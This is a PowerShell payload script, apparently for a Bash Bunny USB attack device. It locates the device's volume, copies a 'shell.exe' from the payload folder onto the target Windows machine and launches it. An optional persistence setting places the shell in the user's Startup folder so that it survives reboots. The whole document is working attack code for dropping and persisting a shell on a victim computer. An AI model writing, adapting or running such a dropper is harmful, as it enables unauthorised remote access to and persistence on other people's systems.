### Edit these variables
$persistence = "False" # Set to "True" if you'd like your shell to persist across reboots
$volumeName = "BashBunny" # "BashBunny" is the default volume name, same value of the label set in payload.txt
$switch_position = "switch1" # Needed for the payload to get the right path
### Done editing (unless you're wanting to do some custom garbage)

$driveName = (Get-WMIObject Win32_Volume | ? { $_.Label -eq $volumeName }).name
$scriptFile = $driveName + "payloads\" + $switch_position + "\shell.exe"
$user = $env:UserName

$scriptDestFile = "C:\temp\shell.exe"

## Set location of shell.vbs based on whether or not persistence is desired
if ( $persistence -eq "True" )
{
	$scriptDestFile = ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\shell.exe")
}

## Create file destinations if they don't exist
If ((Test-Path $scriptDestFile) -eq $false){
	New-Item -ItemType File -Path $scriptDestFile -Force
}

## Copy shell.vbs and shell.exe from the BB to their destined locations
Copy-Item -Path $scriptFile -Destination $scriptDestFile

Set-Location -Path ("C:\temp")
## Change working directory to same location as shell.exe
if ( $persistence -eq "True" )
{
	Set-Location -Path ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
}

Start-Process cmd -ArgumentList "/c start shell.exe"
